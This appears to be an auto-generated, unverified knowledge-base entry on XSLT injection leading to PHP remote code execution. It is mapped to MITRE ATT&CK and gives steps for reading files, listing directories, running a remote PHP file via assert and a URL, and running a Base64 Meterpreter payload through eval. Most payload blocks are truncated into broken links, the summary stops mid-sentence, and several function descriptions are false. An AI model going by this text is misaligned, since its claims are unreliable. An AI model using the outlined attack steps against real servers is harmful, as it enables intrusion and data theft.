---
id: 06a2ebfd-e1d5-487b-85d3-40f14d28f693
name: XSLT Injection - Remote Code Execution with PHP wrapper
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:41.547831+00:00'
updated_at: '2023-04-10T20:24:49.302254+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]'
- '[[Remote File Copy|T1105 - Remote File Copy]]'
- '[[XSL Script Processing|T1220 - XSL Script Processing]]'
tags:
- '[[Exploit]]'
- '[[Remote Code Execution with PHP wrapper]]'
- '[[XSLT Injection]]'
commands:
- '[[Read file]]'
---

# XSLT Injection - Remote Code Execution with PHP wrapper

## Summary

XSLT Injection is a type of attack where an attacker injects malicious XSLT code into a vulnerable web application. The attacker can then use this injection to execute arbitrary code on the target system. In this specific exploit, the attacker is able to achieve Remote Code Execution (RCE) by using

## Description

# Description

XSLT Injection is a type of attack where an attacker injects malicious XSLT code into a vulnerable web application. The attacker can then use this injection to execute arbitrary code on the target system. In this specific exploit, the attacker is able to achieve Remote Code Execution (RCE) by using a PHP wrapper. The attacker can use various commands such as 'Read File', 'Directory Scanner', 'List Directory Contents', 'Remote PHP File Execution Assertion', 'Remote PHP Code Execution', and 'PHP Meterpreter Execution Command' to achieve their goals. This type of attack can be devastating for businesses as it can allow attackers to gain complete control over the target system.

 

## Requirements

1. Access to a vulnerable web application

1. Knowledge of XSLT Injection techniques

1. Ability to execute commands on the target system

 

## Defense

1. Implement input validation and sanitization techniques to prevent XSLT Injection attacks

1. Use a Web Application Firewall (WAF) to detect and block malicious traffic

1. Regularly update and patch web applications to address known vulnerabilities

 

## Objectives

1. Execute arbitrary code on the target system

1. Gain remote access to the target system

1. Exfiltrate sensitive data from the target system

 

# Instructions

1. Use the readfile command to read the contents of a file.

 



**Code**: [[readfile]]



> The readfile command takes one argument, which is the path to the file you want to read. The path can be either an absolute path or a relative path. If the file is not found, an error will be returned. The contents of the file will be returned as a string.



**Command** ([[Read file]]):

```bash
readfile('example.txt')
```



2. This command reads the content of a PHP file and returns it in XML format.

 



**Code**: [[<?xml version="1.0" encoding="UTF-8"?>
<html xsl:v]]



> The 'readfile' function is used to read the content of the specified PHP file. This content is then returned as the value of the 'xsl:value-of' element. The 'xmlns:php' attribute is used to declare the 'php' namespace, which allows the use of the 'readfile' function within the XSLT stylesheet. The 'xsl:version' attribute is used to specify the version of the XSLT stylesheet being used.

3. The scandir function is used to scan a directory and return an array of files and directories within it.

 



**Code**: [[scandir]]



> The scandir function takes one argument, which is the path of the directory to be scanned. The function returns an array of file and directory names, including dot files (files that start with a period). The array is sorted alphabetically. Each array element is an object that contains the following properties: 'name' (the name of the file or directory), 'type' (either 'file' or 'dir' depending on whether it is a file or directory), and 'path' (the full path of the file or directory).

4. This command will list the contents of the current directory.

 



**Code**: [[<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/]]



> The 'scandir' function is used to retrieve the names of all files and directories in the specified directory. The function returns an array of file names and directory names. The '.' argument passed to the function specifies the current directory. The 'xsl:value-of' element is used to output the result of the 'scandir' function to the screen. This command can be useful for quickly checking the contents of a directory.

5. The assert command is used to execute a remote PHP file on a server. The file must be accessible via a URL and contain valid PHP code. The assert command will execute the code and return any output or errors that may occur.

 



**Code**: [[assert]]



> The assert command takes one argument, which is the URL of the remote PHP file to be executed. The URL must be enclosed in quotes. For example: assert('http://example.com/file.php').

6. To execute arbitrary PHP code remotely, replace the URL in the include statement with the URL of the PHP file you want to execute.

 



**Code**: [[<?xml version="1.0" encoding="UTF-8"?>
<html xsl:v]]



> This command can be used to execute arbitrary PHP code on a remote server. The XML document contains an XSLT transformation that includes a remote PHP file and executes its contents using the assert function. The payload variable can be modified to include any PHP code that the attacker wants to execute. This vulnerability can be exploited if the web application is vulnerable to XML External Entity (XXE) injection.

7. To execute a PHP meterpreter using PHP wrapper, follow the below instructions:
1. Copy the Base64-encoded meterpreter code.
2. Replace 'Base64-encoded Meterpreter code' in the given code with the copied code.
3. Run the updated code on the target system.

 



**Code**: [[<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/]]



> This command executes a PHP meterpreter using PHP wrapper. The Base64-encoded meterpreter code is decoded and executed using the eval() function. The preg_replace() function is used to remove any unwanted characters from the executed code.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]
- [[Remote File Copy|T1105 - Remote File Copy]]
- [[XSL Script Processing|T1220 - XSL Script Processing]]

## Commands Used

- [[Read file]]

## Tags

- [[Exploit]]
- [[Remote Code Execution with PHP wrapper]]
- [[XSLT Injection]]


